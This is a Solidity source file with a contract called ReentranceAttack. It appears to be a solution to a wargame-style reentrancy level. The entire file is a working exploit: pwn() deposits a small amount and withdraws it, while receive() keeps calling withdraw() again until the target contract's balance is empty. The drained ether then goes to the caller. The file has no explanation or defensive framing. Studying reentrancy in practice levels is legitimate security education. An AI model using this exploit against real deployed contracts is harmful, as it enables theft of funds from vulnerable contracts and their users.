pragma solidity ^0.8.20;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance private externalContract;
    uint256 amount = 0.001 ether;

    constructor(address payable _externalContract) payable {
        externalContract = IReentrance(_externalContract);
    }

    receive() external payable {
        if (address(externalContract).balance >= amount) {
            externalContract.withdraw(amount);
        }
    }

    function pwn() external payable {
        externalContract.donate{value: amount}(address(this));
        externalContract.withdraw(amount);
        require(address(externalContract).balance == 0, "Reentrancy failed!");
        withdraw();
    }

    function withdraw() private {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }
}
